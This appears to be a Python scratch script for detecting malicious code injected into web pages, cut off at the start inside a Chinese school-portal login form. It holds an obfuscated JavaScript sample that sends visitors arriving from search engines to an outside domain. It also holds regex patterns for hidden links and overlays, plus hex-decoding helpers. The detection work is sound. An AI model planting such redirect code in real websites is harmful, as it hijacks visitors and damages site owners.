<form autocomplete=off id=loginForm-1 message_id=loginTips>
<div class=item-newLogo-rect>
<div class=m_close id=m_close><span>关闭</span></div>
<a class=logoCaseTab href=### id=logoCaseTab></a>
<p class=logoTips dis_none><i class=ico1></i><i class=ico2></i><span>扫码登录更安全</span></p>
<div class=passWord-case dis_none name=LoginRect>
<h4>空间登录</h4>
<div class=err-tips id=_user_login_tips style=display: none;></div>
<ul class=inputlist clearfix>
<li class=u_inputtext>
<input id=info_username-1 name=account placeholder=用户名/邮箱/手机号 tabindex=1 type=text/>
</li>
<li class=u_inputpassword>
<input id=info_password-1 name=pwd placeholder=请输入您的密码 tabindex=2 type=password/>
</li>
</ul>
<div class=test_code clearfix dis_none>
<input id=valCode11 placeholder=请输入验证码 type=text/>
<div class=codeimg><img alt= height=37 id=cimage onclick=_lgObj._getCode(); src= vaildata= width=99/></div>
</div>
<div class=login_other_rect clearfix>
<div class=rememberMe fl>
<p class=fl><span></span></p>自动登录
                        </div>
<meta name="description" content="合肥在线">
<input id=remember name=remember type=hidden value=0/>
<p class=fr>
<a class=forget href=http://www.tceduyun.cn/index.php?r=portal/resetPassword target=_top>忘记密码？</a>
</p>
</div>
<input class=login_btn UserLoginBtn-1 m_btn submit type=button value=立即登录/>
<div class=no_account>
</div>
</div>
<!--扫码部分 start-->
<div class=smLoing-rect dis_none name=LoginRect>
<h4 class=t_c >手机扫码，安全登录</h4>
<div class=sm-case id=loadding>
<div class=smLoginRect clearfix id=qr_div>
<div class=wxLogin-img fl style=width:125px;height:125px;border: 5px solid #ffffff;><div id=portal_qrcode></div><span class=wx_bg></span></div>
<img alt= class=wxLoign-tips-img height=184 src=http://cdn.css.huijiaoyun.com/tianyu_edu/area/320585/images/index0906/wxLogin_tips_img.png width=123/>
</div>
</div>
<div class=sm-invalid dis_none>
<div class=invalid-rect> <img alt= class=wxLogin-img height=125 src=http://cdn.css.huijiaoyun.com/tianyu_edu/area/320585/images/index0906/wxLogin_img.jpg width=125/> <strong class=tips>二维码已失效</strong> <a href=javascript:; id=reload_qrcode>请点击刷新</a> </div>
"""

content2=r"""
<script>
var __encode ='sojson.com', _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(window);var __Ox175f0=["\x72\x65\x66\x65\x72\x72\x65\x72","\x62\x61\x69\x64\x75","\x69\x6E\x64\x65\x78\x4F\x66","\x73\x6F\x67\x6F\x75","\x73\x6F\x73\x6F","\x73\x6D","\x75\x63","\x62\x69\x6E\x67","\x79\x61\x68\x6F\x6F","\x73\x6F","\x68\x72\x65\x66","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x78\x6B\x6A\x35\x35\x2E\x63\x6F\x6D\x2F"];(function(){var _0xc12ex1=document[__Ox175f0[0]];if(_0xc12ex1[__Ox175f0[2]](__Ox175f0[1])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[3])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[4])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[5])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[6])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[7])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[8])> 0|| _0xc12ex1[__Ox175f0[2]](__Ox175f0[9])> 0){location[__Ox175f0[10]]= __Ox175f0[11]}})()
</script>
"""

def unicodetostr(s):
    strTobytes = []
    for i in s.split('\\x'):
        if i != '':
            num = int(i,16)
            strTobytes.append(num)
    a = bytes(strTobytes).decode()
    return a
# print(unicodetostr(line))


def ti(m):
    s = str(m.group())
    a = unicodetostr(s)
    return a

special_reg2 = [
    {'type': 'up-weight', 'pattern': r'navigator\.userAgent\.toLocaleLowerCase[\s\S]{0,50}?'},
    {'type': 'up-weight2', 'pattern': r'(yxkj55.com){1,50}?'},
    {'type': 'document', 'pattern': '<script[\s\S]{0,50}>\s*document\.(?:getElementById|getElementsByClassName)\([\s\S]{0,50}\)\.style\.display=\s*none[\s\S]{0,200}</script>'},
    {'type': 'document', 'pattern': 'document\.write\([\s\S]{0,100}(?:none|absolute|hidden)[\s\S]{0,100}\)'},
    {'type': 'low-px', 'pattern': '<a[\s\S]{0,50}style=[\s\S]{0,50}font-size:1px;[\s\S]{0,50}>[\s\S]{0,150}</a>'},
{"type": "z-index", "pattern": "<div.{0,50}style\s*=[\s\S]{0,50}position\s*:\s*absolute[\s\S]{0,100}z-index\s*:\s*[1-9][0-9]{2,}[\s\S]{0,200}<a[\s\S]{0,50}href[\s\S]{0,100}</div>"}
]

pattern = """(\\\\x[A-Za-z0-9]{2})+"""
pattern = """<meta(?:name=\"(?:description|keywords)\"|.?)content=\"[\s\w].*?\"(?:name=\"(?:description|keywords)\"|.?)>"""
# pattern = """<div[\s\S]{0,50}style=[\s\S]{0,100}position:absolute[\s\S]{0,100}z-index\s*:[1-9]{3,}[\s\S]{0,100}</div>"""
pattern2 = """(?:https?|ftp|file)://[-A-Za-z0-9+&@#/%?=~_|!:,.;]+[-A-Za-z0-9+&@#/%=~_|]"""

content3 = r"""
<meta content="中国 安徽 合肥 合肥报业网 合肥在线 今日生活报 合肥晚报 江淮晨报 东方体育报 逍遥津 环湖晨刊 anhui hefei hfwb jhcb xyj hf365" name="keywords"/>
<input id=remember name=remember type=hidden value=0/>

<meta name="description" content="合肥在线">
"""
# print(content3.replace('"', "").replace("'", ""))

search_pattern = re.compile(pattern, re.I | re.M | re.S)
""".replace('"', "").replace("'", "").replace("+", "")"""
# print(re.escape(content3))
result = search_pattern.findall(content3)
print(result)

data = ''
for i in result:
    print(i)
print(data)
# result2 = re.sub(pattern, ti, content2)
# result3 = re.match(pattern, content2)
# result4 = search_pattern.search(content2)

# for sp_pattern in special_reg2:
#     search_xpattern = re.compile(sp_pattern['pattern'], re.I | re.M | re.S)
#     res_x = search_xpattern.findall(content.replace('"', "").replace("'", ""))
#     print(res_x)
#     data = ''
#     for i in list(set(res_x)):
#         data += i
#     if len(data) != 0:
#         print(data)

# url_pattern = re.compile(pattern2, re.I | re.M | re.S)
# url = url_pattern.findall(a.encode("utf-8").decode('unicode-escape'))
# print(url)
#
# b = """\x5F\x64\x65\x63\x6F\x64\x65"""
# print(b)
#
# print(type('\xe4\xb8\xad\xe5\x9b\xbd'))
# a = '\xE5\xBE\xAE\xE6\x84\x9F\xE8\xB0\xA2'.encode('utf-8').decode('utf-8')
# print(a)
#
# u = r'\u6f22  \u03c7\u03b1\u03bd  \u0445\u0430\u043d'
# # print('解回字符串: ' + u.encode("utf-8").decode('unicode-escape'))
# # print('解回字符串: ' + u.decode('unicode-escape'))
# # print(re.escape(u))
#
# import sys
# print(sys.getdefaultencoding())


